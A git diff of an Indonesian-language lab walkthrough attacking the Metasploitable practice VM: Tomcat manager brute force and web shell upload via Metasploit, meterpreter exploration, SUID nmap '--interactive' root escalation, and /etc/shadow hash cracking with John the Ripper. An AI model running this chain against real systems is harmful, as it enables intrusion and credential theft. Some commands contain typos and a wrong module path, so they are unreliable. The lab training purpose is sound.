@@ -97,6 +97,7 @@ Matching Modules
 ```
 ```
 |Modul	              |Tipe	     |Fungsi
+
 |tomcat_mgr_login	  |scanner	 |Mencari kredensial valid dengan serangan brute-force.	
 |tomcat_mgr_upload	  |exploit	 |Mengunggah dan menyebarkan (deploy) web shell dengan kredensial yang sudah diketahui.
 |tomcat_mgr_deploy	  |exploit	 |Sebagian besar berfungsi sama seperti _upload, yaitu untuk menyebarkan payload.
@@ -132,7 +133,10 @@ exploit
 ```
 use auxiliary/scanner/http/tomcat_mgr_upload
 set RHOSTS <ip_metasploitable>
+set RPORT 8180
 set LHOST <ip_kali_linux>
+set HttpUsername <username>
+set HttpPassword <password>
 exploit
 ```
 
@@ -149,20 +153,76 @@ exploit
 meterpreter >
 ```
 **4. _Maintaining accsess dan Post exploitation_**
-- Verifikasi user atau akses root
+- Mencari informasi sistem
 ```
-whoami
+meterpreter > sysinfo
+Computer        : metasploitable
+OS              : Linux 2.6.24-16-server (i386)
+Architecture    : x86
+System Language : en_US
+Meterpreter     : java/linux
+meterpreter > getuid
+Server username: tomcat55
 ```
-- Eksplorasi sistem
+
+- Menggunakan shell linux untuk eksplorasi
+```
+meterpreter > shell
+```
 ```
 ls -l                    //melihat list file dan direktory
-```
-```
-uname -a                 //melihat versi kernel dan informasi sistem
 ```
 ```
 cat /etc/passwd          //melihat daftar user
 ```
 ```
-cd /root                 //mencari file sensitif
+find / -name “web.xml”		//mencari file penting
 ```
+5. **_Privilege escalation_**
+
+- Mencari SUID binary yang rentan
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+```
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/nmap	         //memanfaatkan celah pada versi nmap lama
+/usr/bin/chsh
+/usr/bin/netkit-rcp
+/usr/bin/passwd
+```
+Versi Nmap yang lama memiliki mode interaktif (_--interactive_) yang memungkinkan pengguna menjalankan perintah shell dengan hak akses root. Saat menjalankan Nmap dalam mode interaktif (_--interactive_), pengguna akan mendapatkan prompt nmap>. Pada titik ini, Nmap tidak lagi berfungsi sebagai pemindai, tetapi sebagai antarmuka interaktif yang dapat mengeksekusi perintah-perintah internalnya sendiri. Jadi, ketika pengguna mengetik !sh atau !bash, pengguna memberitahu Nmap untuk "jalankan shell baru untuk saya".
+- Eksploitasi akses root pada celah ini
+```
+/usr/bin/nmap -–interactive
+```
+```
+nmap> !sh
+```
+- Cek hak akses user setelah  eksploitasi
+```
+whoami
+```
+Jika berhasil, maka hak akses akan berubah menjadi root user
+
+**6. _Cracking Password_**
+
+- Memanfaatkan akses root untuk mendapatkan password
+```
+cat /etc/shadow/
+```
+- Buka terminal baru (kali linux) dan paste isi file tersebut ke file yang baru
+```
+sudo nano <file_password>.txt
+```
+- _Cracking_ file password menggunakan JohnTheRipper
+```
+john –-wordlist=<directory_wordlist> <file_password>.txt
+```
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
+```
+Jika ingin menggunakan **rockyou.txt**, pastikan sudah di ungzip sebelumnya supaya file bisa digunakan.
+
+John the Ripper akan mencoba mencocokkan hash dengan kata-kata dalam daftar dan akan menampilkan kata sandi yang berhasil di-_crack_ di layar. Jika berhasil, pengguna akan mendapatkan kata sandi dalam bentuk teks biasa (misalnya, msfadmin atau toor).
